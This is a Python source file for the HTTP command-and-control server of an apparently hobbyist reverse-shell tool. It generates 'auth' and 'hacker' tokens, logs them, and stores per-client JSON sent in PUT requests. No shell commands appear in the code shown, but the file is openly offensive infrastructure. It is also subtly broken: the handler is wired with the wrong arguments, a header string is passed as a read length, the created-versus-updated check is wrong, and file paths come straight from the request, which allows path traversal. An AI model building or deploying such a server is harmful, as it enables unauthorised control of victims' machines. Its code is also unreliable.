from http.server import HTTPServer, BaseHTTPRequestHandler
from http import HTTPStatus
from functools import partial
from datetime import datetime
from pathlib import Path
import reverse_shell.utils as ut
import json
import uuid
import base64

HOST = "0.0.0.0"
PORT = 80


class ZrevshellServer(BaseHTTPRequestHandler):
    def __init__(self, auth_token: str, hacker_token: str,  *args, **kwargs):
        # auth_token is a base64 message i.e it is a string that has been decoded from a base64 byte using ascii.
        self.auth_token = auth_token
        self.hacker_token = hacker_token

        super().__init__(*args, **kwargs)

    def is_authenticated(self):
        if self.headers.get("Authorization") == f"Basic {self.auth_token}":
            return True
        else:
            self.send_error(HTTPStatus.UNAUTHORIZED)
            return False

    def do_GET(self):
        if self.is_authenticated():
            self.send_response(HTTPStatus.OK)
            self.send_header("Content-Type", "text/html")
            if length := self.headers.get("content-length"):
                content = self.rfile.read(length)
                print(content)
            self.end_headers()

            self.wfile.write(bytes("<html><head><title>We are running a server</title></head> <body> <h1> Hello World </h1> </body></html>", "utf-8"))

    def do_PUT(self):
        if self.is_authenticated():
            if self.headers.get("content-type") == "application/json":
                if self.path != "/":
                    file_path = f".{self.path}.json"
                else:
                    self.send_error(HTTPStatus.BAD_REQUEST)
                    self.end_headers()
                    return
                with open(file_path) as file:
                    data = json.loads(file.read())
                    client_id = self.headers.get("client-id")
                    content_size = int(self.headers.get("content-length"))
                    # Create or modify the data
                    data[client_id] = json.loads(self.rfile.read(content_size))

                # Write the data back to the file
                with open(file_path, "w") as file:
                    file.write(json.dumps(data))

                # If the data exists then send the 200 status code but if it doesn't exist
                # then send the 201 status code
                if client_id in data:
                    self.send_response(HTTPStatus.OK)
                    self.end_headers()
                else:
                    self.send_response(HTTPStatus.CREATED)
                    self.end_headers()
            else:
                self.send_error(HTTPStatus.UNSUPPORTED_MEDIA_TYPE)
                self.end_headers()

# hacker_token + auth_token


def generate_token():
    random_uuid = uuid.uuid4()
    random_encoded_bytes = str(random_uuid).encode('ascii')
    base64_encoded_bytes = base64.b64encode(random_encoded_bytes)
    return base64_encoded_bytes.decode('ascii')


# def decode_token(token: str):
#     ascii_encoded_base64 = token.encode("ascii")
#     decoded_ascii = base64.b64decode(ascii_encoded_base64)
#     return decoded_ascii.decode("ascii")


def initialize_server(auth_token: str | None = None, hacker_token: str | None = None):
    # auth_token is a base64 message i.e it is a string that has been decoded from a base64 byte using ascii.
    if not auth_token:
        auth_token = generate_token()

    if not hacker_token:
        hacker_token = generate_token()

    # Create a log file with the hacker and auth token
    current_time = str(datetime.now())
    current_time = current_time.replace(":", "-")
    current_time = current_time.replace(" ", "-")
    current_time = current_time.split(".")[0]

    # Create the path and stuff
    directory = Path("./logs/")
    directory.mkdir(parents=True, exist_ok=True)

    file_path = directory / f"{current_time}.json"

    with file_path.open("w") as log_file:
        data = {"auth_token": auth_token, "hacker_token": hacker_token}
        log_file.write(json.dumps(data))

    handler = partial(ZrevshellServer, auth_token)

    ut.log("info", f"Server is running on {HOST} port {PORT}...")
    server = HTTPServer((HOST, PORT), handler)
    ut.log("info", f"Generated authentication token -> {auth_token}")
    ut.log("info", f"Generated hacker's token -> {hacker_token}")

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        pass
    print("Server has shutdown.")


initialize_server()
